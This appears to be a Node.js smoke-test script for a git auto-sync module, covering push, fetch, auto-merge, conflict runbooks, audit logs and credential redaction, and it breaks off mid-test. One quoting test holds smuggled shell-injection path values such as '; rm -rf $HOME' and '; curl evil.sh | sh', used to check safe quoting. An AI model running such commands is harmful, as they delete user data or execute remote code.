#!/usr/bin/env node
/**
 * Smoke test: abrain git auto-sync to remote (ADR 0020).
 *
 * Uses a local bare git repo as a fake remote so the smoke runs offline
 * and deterministically. Validates the full taxonomy in git-sync.ts:
 *
 *   1. hasGitRemote: false for non-git dir
 *   2. hasGitRemote: false for git dir without origin
 *   3. hasGitRemote: true for git dir with origin
 *   4. pushAsync on non-git: skipped (no throw, audit recorded)
 *   5. pushAsync ahead=0: noop (no push invoked)
 *   6. pushAsync ahead>0: ok (commits land on remote)
 *   7. pushAsync diverged remote: push_rejected
 *   8. fetchAndFF on non-git: skipped
 *   9. fetchAndFF behind=0: noop
 *  10. fetchAndFF pure ff: ok (local catches up to remote)
 *  11. fetchAndFF diverged (no textual conflict): auto-merges via git
 *       3-way merge; result=ok, merged=<behind> (ADR 0020 rev. 2026-05-17)
 *  12. sync: combined fetch+push happy path
 *  13. sync: divergence with no conflict auto-merges then pushes
 *  13b. fetchAndFF + sync on REAL textual conflict: result=conflict,
 *       merge --abort restores clean tree, runbook lists conflicting paths
 *  14. getStatus snapshot (ahead/behind + last events from audit)
 *  15. formatSyncStatus is a non-empty multi-line string
 *  16. Audit log accumulates one row per op
 *  17. Single-flight: two concurrent pushAsync don't both invoke git push
 *
 * Strategy: real git binary subprocess (already required by sediment writer
 * + abrain bootstrap), local file:// remote, no network. The bare repo
 * acts as authoritative origin/main; we simulate "device B push" by
 * pushing directly to it from a second clone (simulating divergence).
 */

import { createRequire } from "node:module";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, "..");
const require = createRequire(import.meta.url);
const ts = require("typescript");

const failures = [];
let totalChecks = 0;

function check(name, fn) {
  totalChecks++;
  try {
    fn();
    console.log(`  ok    ${name}`);
  } catch (err) {
    failures.push({ name, err });
    console.log(`  FAIL  ${name}\n        ${err.message}`);
  }
}

async function asyncCheck(name, fn) {
  totalChecks++;
  try {
    await fn();
    console.log(`  ok    ${name}`);
  } catch (err) {
    failures.push({ name, err });
    console.log(`  FAIL  ${name}\n        ${err.message}`);
  }
}

function transpile(srcPath) {
  return ts.transpileModule(fs.readFileSync(srcPath, "utf8"), {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2022,
      esModuleInterop: true,
      moduleResolution: ts.ModuleResolutionKind.NodeJs,
    },
  }).outputText;
}

function git(cwd, args, opts = {}) {
  const env = {
    ...process.env,
    GIT_AUTHOR_NAME: "Smoke",
    GIT_AUTHOR_EMAIL: "smoke@local",
    GIT_COMMITTER_NAME: "Smoke",
    GIT_COMMITTER_EMAIL: "smoke@local",
  };
  const res = spawnSync("git", args, { cwd, env, encoding: "utf-8", ...opts });
  if (res.status !== 0 && !opts.allowFail) {
    throw new Error(`git ${args.join(" ")} failed (${res.status}): ${res.stderr}`);
  }
  return res;
}

// ── Compile git-sync.ts ────────────────────────────────────────────
// ADR 0022 P1: git-sync.ts now `export { redactCredentials } from "./redact"`,
// so we must also transpile redact.ts into the same tmpDir and bridge
// `./redact` to the .cjs output (CJS resolver looks for .js / index.js).
const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-astack-git-sync-"));
fs.writeFileSync(
  path.join(tmpDir, "redact.cjs"),
  transpile(path.join(repoRoot, "extensions/abrain/redact.ts")),
);
fs.writeFileSync(
  path.join(tmpDir, "redact.js"),
  `module.exports = require("./redact.cjs");\n`,
);
fs.writeFileSync(
  path.join(tmpDir, "git-sync.cjs"),
  transpile(path.join(repoRoot, "extensions/abrain/git-sync.ts")),
);
// git-sync.ts also imports two `_shared` modules; the transpiled CJS
// resolves `../_shared/<m>` relative to tmpDir → <os-tmp>/_shared. Bridge
// BOTH explicitly so this smoke is self-sufficient on a clean machine
// (before PR-1 it silently leaned on /tmp/_shared residue that other
// smokes — e.g. smoke-dispatch-output-format — happened to leave behind):
//   - causal-anchor:    minimal stub (anchor enrichment is not under test)
//   - git-singleflight: REAL transpiled module (check 17's serialization
//     now flows through it — a stub would fake the very behavior under test)
const sharedBridgeDir = path.join(tmpDir, "..", "_shared");
fs.mkdirSync(sharedBridgeDir, { recursive: true });
fs.writeFileSync(
  path.join(sharedBridgeDir, "causal-anchor.js"),
  `module.exports = { getCurrentAnchor: () => undefined, spreadAnchor: () => ({}) };\n`,
);
fs.writeFileSync(
  path.join(sharedBridgeDir, "git-singleflight.js"),
  transpile(path.join(repoRoot, "extensions/_shared/git-singleflight.ts")),
);
const gitSync = require(path.join(tmpDir, "git-sync.cjs"));

// ── Set up fake remote (bare repo) ─────────────────────────────────
// Workspace layout under tmpDir:
//   remote.git/        bare repo acting as origin
//   deviceA/.abrain/   primary local clone (the one we drive with git-sync)
//   deviceB/.abrain/   secondary clone used to simulate "another device pushed"
//   noremote/.abrain/  git repo without an origin remote
//   notgit/            plain dir, not a git repo

const remoteDir = path.join(tmpDir, "remote.git");
const deviceA = path.join(tmpDir, "deviceA", ".abrain");
const deviceB = path.join(tmpDir, "deviceB", ".abrain");
const noRemote = path.join(tmpDir, "noremote", ".abrain");
const notGit = path.join(tmpDir, "notgit");

fs.mkdirSync(remoteDir, { recursive: true });
fs.mkdirSync(path.dirname(deviceA), { recursive: true });
fs.mkdirSync(path.dirname(deviceB), { recursive: true });
fs.mkdirSync(noRemote, { recursive: true });
fs.mkdirSync(notGit, { recursive: true });

git(remoteDir, ["init", "--bare", "--initial-branch=main"]);

// Bootstrap deviceA with one commit so origin/main exists on remote.
// .gitignore mirrors what `ensureAbrainStateGitignored()` writes in
// production (P1-C audit fix): `.state/` is audit log territory, must
// never enter the index. Without it, `git status --porcelain` would
// flag `.state/` as untracked and the post-merge clean-tree assertions
// in sections 6 and 9b would fail spuriously.
git(path.dirname(deviceA), ["clone", remoteDir, ".abrain"]);
fs.writeFileSync(path.join(deviceA, ".gitignore"), ".state/\n");
fs.writeFileSync(path.join(deviceA, "seed.md"), "# initial\n");
git(deviceA, ["add", ".gitignore", "seed.md"]);
git(deviceA, ["commit", "-m", "initial"]);
git(deviceA, ["branch", "-M", "main"]);
git(deviceA, ["push", "-u", "origin", "main"]);

// Clone deviceB from same remote so it shares history.
git(path.dirname(deviceB), ["clone", remoteDir, ".abrain"]);
git(deviceB, ["checkout", "main"]);

// noRemote: git repo without origin
git(noRemote, ["init", "--initial-branch=main"]);
fs.writeFileSync(path.join(noRemote, "x.md"), "x\n");
git(noRemote, ["add", "x.md"]);
git(noRemote, ["commit", "-m", "x"]);

// notGit: just a directory

console.log(`tmp workspace: ${tmpDir}`);
console.log(`fake remote:   ${remoteDir}`);

// ── 1. hasGitRemote taxonomy ───────────────────────────────────────
console.log("\n[1] hasGitRemote taxonomy");
await asyncCheck("hasGitRemote returns false for non-git directory", async () => {
  const r = await gitSync.hasGitRemote(notGit);
  if (r !== false) throw new Error(`expected false, got ${r}`);
});
await asyncCheck("hasGitRemote returns false for git repo without origin", async () => {
  const r = await gitSync.hasGitRemote(noRemote);
  if (r !== false) throw new Error(`expected false, got ${r}`);
});
await asyncCheck("hasGitRemote returns true for git repo with origin", async () => {
  const r = await gitSync.hasGitRemote(deviceA);
  if (r !== true) throw new Error(`expected true, got ${r}`);
});

// ── 2. pushAsync on inactive backends → skipped ────────────────────
console.log("\n[2] pushAsync inactive cases (skipped)");
await asyncCheck("pushAsync on non-git dir returns skipped (no throw)", async () => {
  const ev = await gitSync.pushAsync({ abrainHome: notGit });
  if (ev.result !== "skipped") throw new Error(`expected skipped, got ${ev.result}`);
  if (ev.op !== "push") throw new Error(`expected op=push, got ${ev.op}`);
});
await asyncCheck("pushAsync on git-without-remote returns skipped", async () => {
  const ev = await gitSync.pushAsync({ abrainHome: noRemote });
  if (ev.result !== "skipped") throw new Error(`expected skipped, got ${ev.result}`);
});

// ── 3. pushAsync ahead=0 → noop ────────────────────────────────────
console.log("\n[3] pushAsync noop / ok happy path");
await asyncCheck("pushAsync with ahead=0 returns noop (no commits to push)", async () => {
  // deviceA is already synced after initial push
  const ev = await gitSync.pushAsync({ abrainHome: deviceA });
  if (ev.result !== "noop") throw new Error(`expected noop, got ${ev.result} (error: ${ev.error})`);
  if (ev.ahead !== 0) throw new Error(`expected ahead=0, got ${ev.ahead}`);
});

// Make a local commit on A, then push.
fs.writeFileSync(path.join(deviceA, "a-only.md"), "from device A\n");
git(deviceA, ["add", "a-only.md"]);
git(deviceA, ["commit", "-m", "from A"]);
await asyncCheck("pushAsync with ahead=1 returns ok and lands commit on remote", async () => {
  const ev = await gitSync.pushAsync({ abrainHome: deviceA });
  if (ev.result !== "ok") throw new Error(`expected ok, got ${ev.result} (error: ${ev.error})`);
  // Verify remote actually has the commit
  const log = git(remoteDir, ["log", "--oneline", "-5"]);
  if (!log.stdout.includes("from A")) {
    throw new Error(`remote bare repo doesn't contain expected commit:\n${log.stdout}`);
  }
});

// ── 4. pushAsync diverged → push_rejected ──────────────────────────
console.log("\n[4] pushAsync rejected (remote diverged)");

// Simulate device B pushing a commit while device A is unaware.
fs.writeFileSync(path.join(deviceB, "b-only.md"), "from device B\n");
git(deviceB, ["pull", "origin", "main"]); // get device A's latest first
git(deviceB, ["add", "b-only.md"]);
git(deviceB, ["commit", "-m", "from B"]);
git(deviceB, ["push", "origin", "main"]);

// Now device A makes another local commit without knowing remote moved.
fs.writeFileSync(path.join(deviceA, "a-extra.md"), "more from A\n");
git(deviceA, ["add", "a-extra.md"]);
git(deviceA, ["commit", "-m", "more from A"]);

// pushAsync should report push_rejected. (Note: ahead/behind comparison
// uses origin/main as last fetched, so locally we appear ahead. The
// classification depends on push stderr containing "rejected"/"non-fast-forward".)
await asyncCheck("pushAsync against diverged remote returns push_rejected", async () => {
  const ev = await gitSync.pushAsync({ abrainHome: deviceA });
  if (ev.result !== "push_rejected") {
    throw new Error(`expected push_rejected, got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.error) throw new Error("expected error field with stderr");
});

// ── 5. fetchAndFF inactive cases ───────────────────────────────────
console.log("\n[5] fetchAndFF inactive cases");
await asyncCheck("fetchAndFF on non-git returns skipped", async () => {
  const ev = await gitSync.fetchAndFF({ abrainHome: notGit });
  if (ev.result !== "skipped") throw new Error(`expected skipped, got ${ev.result}`);
  if (ev.op !== "fetch") throw new Error(`expected op=fetch, got ${ev.op}`);
});

// ── 6. fetchAndFF diverged ─────────────────────────────────────────
// deviceA still has unsynced "more from A" + remote has B's commit.
// 2026-05-17 (ADR 0020 rev.): divergence now triggers a git 3-way merge.
// When the two sides touch disjoint files (a-extra.md vs b-only.md, here),
// git resolves automatically and we expect result=ok with merged>0.
console.log("\n[6] fetchAndFF diverged — auto-merge (disjoint files)");
await asyncCheck("fetchAndFF with both sides ahead on disjoint files auto-merges and returns ok", async () => {
  const ev = await gitSync.fetchAndFF({ abrainHome: deviceA });
  if (ev.result !== "ok") {
    throw new Error(`expected ok (auto-merge), got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.merged || ev.merged < 1) {
    throw new Error(`expected merged>=1, got ${ev.merged}`);
  }
  // After auto-merge both sides' commits must be present.
  const log = git(deviceA, ["log", "--oneline", "-10"]);
  if (!log.stdout.includes("from B")) {
    throw new Error(`expected B's commit to be merged in; got:\n${log.stdout}`);
  }
  if (!log.stdout.includes("more from A")) {
    throw new Error(`expected A's local commit to survive merge; got:\n${log.stdout}`);
  }
  if (!log.stdout.includes("abrain auto-merge")) {
    throw new Error(`expected 'abrain auto-merge' commit in log; got:\n${log.stdout}`);
  }
  const status = git(deviceA, ["status", "--porcelain"]);
  if (status.stdout.trim() !== "") {
    throw new Error(`expected clean working tree post-merge; got:\n${status.stdout}`);
  }
  // Round 3 audit (gpt MINOR-2 + deepseek new-smoke-2): pin the merge
  // commit subject AND the author/committer identity. Without this,
  // a regression that drops the `-c user.name=` flag or the MERGE_ENV
  // override would silently let the developer's identity end up on
  // machine-generated convergence commits.
  const tipInfo = git(deviceA, [
    "log", "-1", "--format=subject:%s%nauthor:%an <%ae>%ncommitter:%cn <%ce>%nparents:%P",
  ]).stdout;
  if (!tipInfo.includes(`subject:abrain auto-merge: integrate ${ev.merged} commit(s) from origin/main`)) {
    throw new Error(`merge commit subject mismatch; got:\n${tipInfo}`);
  }
  if (!tipInfo.includes("author:abrain-autosync <autosync@abrain.local>")) {
    throw new Error(`merge author should be abrain-autosync; got:\n${tipInfo}`);
  }
  if (!tipInfo.includes("committer:abrain-autosync <autosync@abrain.local>")) {
    throw new Error(`merge committer should be abrain-autosync; got:\n${tipInfo}`);
  }
  // Parent count must be 2 (we forced --no-ff).
  const parentsLine = tipInfo.split("\n").find((l) => l.startsWith("parents:")) || "";
  const parentSHAs = parentsLine.slice("parents:".length).trim().split(/\s+/).filter(Boolean);
  if (parentSHAs.length !== 2) {
    throw new Error(`expected 2-parent merge commit; got ${parentSHAs.length}: ${parentsLine}`);
  }
});

// ── 7. fetchAndFF pure ff (no local commits) ───────────────────────
console.log("\n[7] fetchAndFF pure fast-forward");
// Reset device A to a state where it's purely behind remote.
git(deviceA, ["reset", "--hard", "origin/main"]); // discard "more from A"
// Have device B push another commit.
fs.writeFileSync(path.join(deviceB, "b-extra.md"), "more from B\n");
git(deviceB, ["add", "b-extra.md"]);
git(deviceB, ["commit", "-m", "more from B"]);
git(deviceB, ["push", "origin", "main"]);

await asyncCheck("fetchAndFF with only remote ahead returns ok and ff-merges", async () => {
  const ev = await gitSync.fetchAndFF({ abrainHome: deviceA });
  if (ev.result !== "ok") {
    throw new Error(`expected ok, got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.behind || ev.behind < 1) throw new Error(`expected behind>=1, got ${ev.behind}`);
  const log = git(deviceA, ["log", "--oneline", "-3"]);
  if (!log.stdout.includes("more from B")) {
    throw new Error(`expected fast-forward to bring 'more from B' into local:\n${log.stdout}`);
  }
});

await asyncCheck("fetchAndFF with no remote changes returns noop", async () => {
  const ev = await gitSync.fetchAndFF({ abrainHome: deviceA });
  if (ev.result !== "noop") {
    throw new Error(`expected noop, got ${ev.result}`);
  }
});

// ── 8. sync() combined op happy path ──────────────────────────────
console.log("\n[8] sync() combined fetch+push");
// Device A: ff'd up, no diverge, one new local commit to push.
fs.writeFileSync(path.join(deviceA, "a-sync.md"), "sync test\n");
git(deviceA, ["add", "a-sync.md"]);
git(deviceA, ["commit", "-m", "sync test"]);

await asyncCheck("sync() fetches + pushes when no divergence", async () => {
  const result = await gitSync.sync({ abrainHome: deviceA });
  if (!result.ok) throw new Error(`expected ok, got summary: ${result.summary}`);
  if (!result.summary.includes("synced")) {
    throw new Error(`expected 'synced' in summary, got: ${result.summary}`);
  }
  if (result.events.length !== 2) {
    throw new Error(`expected 2 events (fetch+push), got ${result.events.length}`);
  }
  const log = git(remoteDir, ["log", "--oneline", "-5"]);
  if (!log.stdout.includes("sync test")) {
    throw new Error(`remote missing 'sync test' commit:\n${log.stdout}`);
  }
});

// ── 9. sync() diverged surfaces runbook ───────────────────────────
console.log("\n[9] sync() divergence — auto-merge + push happy path");
// Make deviceA and remote diverge again on disjoint files.
fs.writeFileSync(path.join(deviceB, "b-final.md"), "B final\n");
git(deviceB, ["pull", "origin", "main"]);
git(deviceB, ["add", "b-final.md"]);
git(deviceB, ["commit", "-m", "B final"]);
git(deviceB, ["push", "origin", "main"]);

fs.writeFileSync(path.join(deviceA, "a-final.md"), "A final\n");
git(deviceA, ["add", "a-final.md"]);
git(deviceA, ["commit", "-m", "A final"]);

await asyncCheck("sync() on divergence (no conflict) auto-merges, pushes, returns ok", async () => {
  const result = await gitSync.sync({ abrainHome: deviceA });
  if (!result.ok) {
    throw new Error(`expected ok=true on no-conflict divergence; got summary: ${result.summary}`);
  }
  if (!result.summary.includes("auto-merged")) {
    throw new Error(`expected 'auto-merged' in summary, got: ${result.summary}`);
  }
  if (result.events.length !== 2) {
    throw new Error(`expected 2 events (fetch+push), got ${result.events.length}`);
  }
  const fetchEv = result.events[0];
  if (fetchEv.result !== "ok" || !fetchEv.merged) {
    throw new Error(`expected fetch result=ok with merged>0, got ${fetchEv.result} merged=${fetchEv.merged}`);
  }
  const remoteLog = git(remoteDir, ["log", "--oneline", "-10"]);
  if (!remoteLog.stdout.includes("A final")) {
    throw new Error(`remote missing A's commit after sync:\n${remoteLog.stdout}`);
  }
  if (!remoteLog.stdout.includes("abrain auto-merge")) {
    throw new Error(`remote missing auto-merge commit:\n${remoteLog.stdout}`);
  }
});

// [9b] fetchAndFF + sync on REAL textual conflict
console.log("\n[9b] fetchAndFF/sync on textual conflict — abort + runbook");
const conflictFile = "conflict-target.md";
// Seed both sides from a common base containing conflictFile.
git(deviceB, ["pull", "origin", "main"]);
fs.writeFileSync(path.join(deviceB, conflictFile), "line 1: original\nline 2: original\n");
git(deviceB, ["add", conflictFile]);
git(deviceB, ["commit", "-m", "seed conflict file"]);
git(deviceB, ["push", "origin", "main"]);
await gitSync.fetchAndFF({ abrainHome: deviceA });
// Both devices edit the SAME line.
fs.writeFileSync(path.join(deviceA, conflictFile), "line 1: A's change\nline 2: original\n");
git(deviceA, ["add", conflictFile]);
git(deviceA, ["commit", "-m", "A changes line 1"]);
fs.writeFileSync(path.join(deviceB, conflictFile), "line 1: B's change\nline 2: original\n");
git(deviceB, ["add", conflictFile]);
git(deviceB, ["commit", "-m", "B changes line 1"]);
git(deviceB, ["push", "origin", "main"]);

await asyncCheck("fetchAndFF on real conflict returns result=conflict and restores clean tree", async () => {
  const headBefore = git(deviceA, ["rev-parse", "HEAD"]).stdout.trim();
  const ev = await gitSync.fetchAndFF({ abrainHome: deviceA });
  if (ev.result !== "conflict") {
    throw new Error(`expected conflict, got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.conflictPaths || !ev.conflictPaths.includes(conflictFile)) {
    throw new Error(`expected conflictPaths to include '${conflictFile}', got: ${JSON.stringify(ev.conflictPaths)}`);
  }
  const headAfter = git(deviceA, ["rev-parse", "HEAD"]).stdout.trim();
  if (headAfter !== headBefore) {
    throw new Error(`HEAD changed across failed merge: ${headBefore} -> ${headAfter}`);
  }
  const status = git(deviceA, ["status", "--porcelain"]);
  if (status.stdout.trim() !== "") {
    throw new Error(`expected clean working tree post-abort; got:\n${status.stdout}`);
  }
  if (fs.existsSync(path.join(deviceA, ".git", "MERGE_HEAD"))) {
    throw new Error(`MERGE_HEAD still present after abort — merge state leaked`);
  }
});

await asyncCheck("sync() on real conflict returns ok=false with runbook listing conflicting paths", async () => {
  const result = await gitSync.sync({ abrainHome: deviceA });
  if (result.ok) throw new Error(`expected ok=false on conflict`);
  for (const hint of ["conflict", `cd '${deviceA}'`, "git merge origin/main", "/abrain sync"]) {
    if (!result.summary.includes(hint)) {
      throw new Error(`expected hint '${hint}' in summary, got: ${result.summary}`);
    }
  }
  if (!result.summary.includes(conflictFile)) {
    throw new Error(`expected conflict file '${conflictFile}' named in runbook; got: ${result.summary}`);
  }
  if (result.events.length !== 1) {
    throw new Error(`expected 1 event (fetch only — push skipped on conflict), got ${result.events.length}`);
  }
});

// ── 10. getStatus snapshot ────────────────────────────────────────
console.log("\n[10] getStatus snapshot");
await asyncCheck("getStatus returns isGitRepo=false for non-git dir", async () => {
  const s = await gitSync.getStatus(notGit);
  if (s.isGitRepo !== false) throw new Error(`expected isGitRepo=false`);
  if (s.ahead !== 0 || s.behind !== 0) throw new Error("expected zero counters");
});

await asyncCheck("getStatus returns remote/branch + last events on repo with prior conflict", async () => {
  const s = await gitSync.getStatus(deviceA);
  if (!s.isGitRepo) throw new Error("expected isGitRepo=true");
  if (!s.remote || !s.remote.includes("remote.git")) {
    throw new Error(`expected remote pointing to bare repo, got: ${s.remote}`);
  }
  if (s.branch !== "main") throw new Error(`expected branch=main, got: ${s.branch}`);
  if (!s.ahead || s.ahead < 1) throw new Error(`expected ahead>=1, got ${s.ahead}`);
  if (!s.behind || s.behind < 1) throw new Error(`expected behind>=1, got ${s.behind}`);
  if (!s.lastFetch) throw new Error("expected lastFetch from audit log");
  if (!s.lastPush) throw new Error("expected lastPush from audit log");
  if (s.lastFetch.result !== "conflict") {
    throw new Error(`expected lastFetch.result='conflict' after section 9b, got '${s.lastFetch.result}'`);
  }
});

// ── 11. formatSyncStatus ──────────────────────────────────────────
console.log("\n[11] formatSyncStatus output");
await asyncCheck("formatSyncStatus shows ahead/behind and surfaces conflict from lastFetch", async () => {
  const s = await gitSync.getStatus(deviceA);
  const out = gitSync.formatSyncStatus(s);
  if (!out || out.length < 10) throw new Error(`formatSyncStatus output too short: '${out}'`);
  if (!out.includes("ahead:")) throw new Error("missing 'ahead:'");
  if (!out.includes("behind:")) throw new Error("missing 'behind:'");
  // 2026-05-17: ahead+behind>0 alone is no longer a warning state — only
  // lastFetch.result === 'conflict' is. After section 9b, the warning
  // hint MUST be triggered in the formatted output.
  if (s.lastFetch?.result === "conflict" && !out.includes("merge conflict")) {
    throw new Error(`expected 'merge conflict' hint when last fetch hit a conflict; got:\n${out}`);
  }
});

check("formatSyncStatus on non-git returns expected sentinel", () => {
  const out = gitSync.formatSyncStatus({ isGitRepo: false, ahead: 0, behind: 0 });
  if (!out.includes("not a git repo")) throw new Error(`expected 'not a git repo', got: ${out}`);
});

// ── 12. audit log accumulation ────────────────────────────────────
console.log("\n[12] audit log accumulation");
check("audit log accumulates one row per op", () => {
  const auditPath = path.join(deviceA, ".state", "git-sync.jsonl");
  if (!fs.existsSync(auditPath)) throw new Error(`audit log not found at ${auditPath}`);
  const lines = fs.readFileSync(auditPath, "utf-8").trim().split("\n");
  // We've run multiple push/fetch/sync ops above. At minimum we should see >= 8.
  if (lines.length < 8) throw new Error(`expected >= 8 audit rows, got ${lines.length}`);
  // Each line must be valid JSON with op/result/ts fields.
  for (const line of lines) {
    const ev = JSON.parse(line);
    if (!ev.ts || !ev.op || !ev.result) {
      throw new Error(`malformed audit row: ${line}`);
    }
    if (!["push", "fetch", "sync"].includes(ev.op)) {
      throw new Error(`unexpected op: ${ev.op}`);
    }
  }
});

// ── 13. single-flight in-process serialization ────────────────────
console.log("\n[13] single-flight queue serialization");
await asyncCheck("two concurrent pushAsync calls serialize (no git index.lock contention)", async () => {
  git(deviceA, ["reset", "--hard", "origin/main"], { allowFail: true });
  fs.writeFileSync(path.join(deviceA, "concurrent.md"), "concurrent\n");
  git(deviceA, ["add", "concurrent.md"]);
  git(deviceA, ["commit", "-m", "concurrent test"]);

  const [r1, r2] = await Promise.all([
    gitSync.pushAsync({ abrainHome: deviceA }),
    gitSync.pushAsync({ abrainHome: deviceA }),
  ]);

  const results = [r1.result, r2.result].sort();
  if (results[0] === "failed" || results[1] === "failed") {
    throw new Error(`expected serialized push, got results: ${results.join(",")} (errors: ${r1.error}, ${r2.error})`);
  }
  if (!(results.includes("ok") || results.every((r) => r === "noop"))) {
    throw new Error(`unexpected result combination: ${results.join(",")}`);
  }
});

await asyncCheck("3 concurrent pushAsync calls all serialize (gpt #2 TOCTOU regression test)", async () => {
  // Round 2 audit found that the previous singleFlight had a TOCTOU race:
  // when 3+ callers all awaited the same prior inflightOp, they each ran
  // fn() in parallel after the prior resolved. The new tail-chained queue
  // runs them strictly serially. The previous smoke (2 callers only) didn't
  // exercise the bug because with 2 callers, the second naturally waited
  // on the first — the race needs >=3 to manifest.
  git(deviceA, ["reset", "--hard", "origin/main"], { allowFail: true });
  fs.writeFileSync(path.join(deviceA, "three-way.md"), "three-way\n");
  git(deviceA, ["add", "three-way.md"]);
  git(deviceA, ["commit", "-m", "three-way concurrent"]);

  const [r1, r2, r3] = await Promise.all([
    gitSync.pushAsync({ abrainHome: deviceA }),
    gitSync.pushAsync({ abrainHome: deviceA }),
    gitSync.pushAsync({ abrainHome: deviceA }),
  ]);

  const results = [r1.result, r2.result, r3.result];
  for (const r of [r1, r2, r3]) {
    if (r.result === "failed" && r.error && /index\.lock/i.test(r.error)) {
      throw new Error(`single-flight queue regression: index.lock contention in 3-way race. Results: ${JSON.stringify(results)} Errors: ${r.error}`);
    }
  }
  // Exactly one should be 'ok' (the first to actually push); the other two
  // should be 'noop' (saw nothing to push after the first completed).
  const okCount = results.filter((r) => r === "ok").length;
  const noopCount = results.filter((r) => r === "noop").length;
  if (okCount !== 1 || noopCount !== 2) {
    throw new Error(`expected exactly 1 ok + 2 noop in 3-way queue, got: ${JSON.stringify(results)}`);
  }
});

// [14] PI_ABRAIN_NO_AUTOSYNC contract
console.log("\n[14] PI_ABRAIN_NO_AUTOSYNC env contract");
await asyncCheck("git-sync ops still execute when called directly under PI_ABRAIN_NO_AUTOSYNC=1 (env is caller-layer gate)", async () => {
  // Round 2 audit (deepseek M3): document the contract that git-sync.ts
  // is policy-neutral. The env var gates AUTO callers (abrain extension
  // activate, sediment writer post-commit) but not direct API users like
  // /abrain sync. This smoke pins that contract so a future refactor
  // doesn't accidentally wire the env check INTO git-sync.ts and break
  // /abrain sync's intentional manual-override semantics.
  const prev = process.env.PI_ABRAIN_NO_AUTOSYNC;
  process.env.PI_ABRAIN_NO_AUTOSYNC = "1";
  try {
    const r = await gitSync.pushAsync({ abrainHome: deviceA, timeoutMs: 5000 });
    if (!["ok", "noop", "skipped", "push_rejected"].includes(r.result)) {
      throw new Error(`unexpected result under PI_ABRAIN_NO_AUTOSYNC=1: ${r.result} (${r.error})`);
    }
  } finally {
    if (prev === undefined) delete process.env.PI_ABRAIN_NO_AUTOSYNC;
    else process.env.PI_ABRAIN_NO_AUTOSYNC = prev;
  }
});

// [15] Round 2 audit: credential redaction + path quoting
console.log("\n[15] credential redaction + shell-quoted runbook path (Round 2 audit)");
check("redactCredentials strips user:pass from https URLs", () => {
  const cases = [
    ["https://alice:secret@host.example.com/repo.git", "https://***@host.example.com/repo.git"],
    ["https://token@host/path",                         "https://***@host/path"],
    ["http://u:p@host/r",                                "http://***@host/r"],
    ["git@github.com:user/repo.git",                     "git@github.com:user/repo.git"],
    ["https://host/no-userinfo.git",                     "https://host/no-userinfo.git"],
    ["fatal: unable to access 'https://alice:tok@host/x' returned 401", "fatal: unable to access 'https://***@host/x' returned 401"],
  ];
  for (const [input, expected] of cases) {
    const got = gitSync.redactCredentials(input);
    if (got !== expected) throw new Error(`redactCredentials('${input}') = '${got}', expected '${expected}'`);
  }
});

check("shellQuotePath produces single-quoted POSIX-safe argument", () => {
  const cases = [
    ["/home/user/.abrain",                            "'/home/user/.abrain'"],
    ["/path with spaces/.abrain",                     "'/path with spaces/.abrain'"],
    ["/path/with/'apostrophe'/.abrain",               "'/path/with/'\\''apostrophe'\\''/.abrain'"],
    ["/tmp/evil\"; rm -rf $HOME; #",                  "'/tmp/evil\"; rm -rf $HOME; #'"],
    ["/tmp/evil'; curl evil.sh | sh; #",              "'/tmp/evil'\\''; curl evil.sh | sh; #'"],
  ];
  for (const [input, expected] of cases) {
    const got = gitSync.shellQuotePath(input);
    if (got !== expected) throw new Error(`shellQuotePath('${input}') = '${got}', expected '${expected}'`);
  }
});

check("shellQuotePath refuses control characters with safe placeholder", () => {
  const got = gitSync.shellQuotePath("/path/with\nnewline");
  if (!got.includes("control characters")) throw new Error(`expected control-char placeholder, got: ${got}`);
  if (got.includes("\n")) throw new Error(`shellQuotePath leaked newline: ${JSON.stringify(got)}`);
});

await asyncCheck("sync() runbook contains shell-quoted abrainHome (opus M2 regression test)", async () => {
  // Re-create a textual conflict so the runbook string carries the
  // shell-quoted path. Reset A to remote, push a seed file, then have
  // both devices edit the same line of that file.
  const qfile = "r2-quote-conflict.md";
  git(deviceA, ["reset", "--hard", "origin/main"], { allowFail: true });
  fs.writeFileSync(path.join(deviceA, qfile), "x\n");
  git(deviceA, ["add", qfile]);
  git(deviceA, ["commit", "-m", "r2-quote seed"]);
  git(deviceA, ["push", "origin", "main"]);
  git(deviceB, ["pull", "origin", "main"], { allowFail: true });
  fs.writeFileSync(path.join(deviceA, qfile), "A r2-quote conflicting\n");
  git(deviceA, ["add", qfile]);
  git(deviceA, ["commit", "-m", "A r2-quote conflict"]);
  fs.writeFileSync(path.join(deviceB, qfile), "B r2-quote conflicting\n");
  git(deviceB, ["add", qfile]);
  git(deviceB, ["commit", "-m", "B r2-quote conflict"]);
  git(deviceB, ["push", "origin", "main"]);
  const result = await gitSync.sync({ abrainHome: deviceA });
  if (!result.summary.includes("conflict")) throw new Error(`expected conflict, got: ${result.summary}`);
  const expectedQuoted = `'${deviceA}'`;
  if (!result.summary.includes(expectedQuoted)) {
    throw new Error(`runbook missing shell-quoted abrainHome ${expectedQuoted}\nGot: ${result.summary}`);
  }
});

// [16] _queueDepth() exposed for tests
console.log("\n[16] _queueDepth() introspection");
check("_queueDepth returns hasInflight=true after first op flowed through", () => {
  const depth = gitSync._queueDepth();
  if (depth.hasInflight !== true) throw new Error(`expected hasInflight=true after >40 ops, got: ${JSON.stringify(depth)}`);
});

// [17] Round 3 audit regressions — error-classification + preflight contracts.
// Goal: pin the catch-block taxonomy so a future refactor can't silently
// regress to "all merge failures = conflict".
console.log("\n[17] Round 3 audit: merge-failure classification & preflight");

// 17.1 — dirty working tree must be reported as `failed`, NOT `conflict`.
await asyncCheck("fetchAndFF refuses auto-merge on dirty working tree (returns failed)", async () => {
  // Build a fresh deviceA-style clone so we don't disturb later assertions.
  const dirtyDev = path.join(tmpDir, "dirty-tree", ".abrain");
  fs.mkdirSync(path.dirname(dirtyDev), { recursive: true });
  git(path.dirname(dirtyDev), ["clone", remoteDir, ".abrain"]);
  // origin/main already carries deviceA's .gitignore from section setup
  // (which mirrors production's `ensureAbrainStateGitignored`), so .state/
  // is ignored here too — the dirty-tree check fires only on real content.
  // Create divergence on disjoint files so the merge path would normally
  // succeed cleanly.
